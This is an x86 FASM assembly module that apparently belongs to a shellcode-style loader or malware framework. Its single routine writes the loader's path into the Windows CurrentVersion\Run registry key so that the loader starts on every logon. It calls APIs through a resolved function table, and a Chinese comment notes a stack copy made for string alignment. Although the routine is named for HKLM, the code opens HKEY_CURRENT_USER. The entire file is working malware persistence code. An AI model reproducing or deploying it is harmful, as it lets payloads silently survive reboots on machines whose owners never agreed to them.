include '../include/global.inc'
include 'win32a.inc'

use32

FUNCTION_DATA_BEGIN add_startup_hklm_x86

proc add_startup_hklm_x86 stdcall uses ebx esi edi, global_data: dword
	locals
		root	_HKEY	?
		tempkey _WCHAR	100	dup(?)
	endl

	mov esi, [global_data]

	assume esi: global_data_t

	lea eax, [root]
	push eax
	push dword KEY_WRITE
	push 0
	PUSH_ANSI_STRING 'Software\Microsoft\Windows\CurrentVersion\Run'
	push dword HKEY_CURRENT_USER
	invoke esi.RegOpenKeyExA 
	test eax, eax
	jnz .error_exit

	; windows底层有检查字符串的对齐，对齐不正确的话会报错, 所以这里拷贝到堆栈里
	lea ebx, [tempkey]
	invoke esi.RtlZeroMemory, ebx, 100 * 2
	lea ecx, [esi.nklm_name]
	push ecx
	push ebx
	invoke esi.lstrcpyW

	lea edi, [esi.loader_path]
	invoke esi.lstrlenW, edi
	add eax, 1
	shl eax, 1  ; len * 2  
	
	invoke esi.RegSetValueExW, [root], ebx, 0, REG_SZ, edi, eax
	invoke esi.RegCloseKey, [root]

.error_exit:
	ret
endp

FUNCTION_DATA_END add_startup_hklm_x86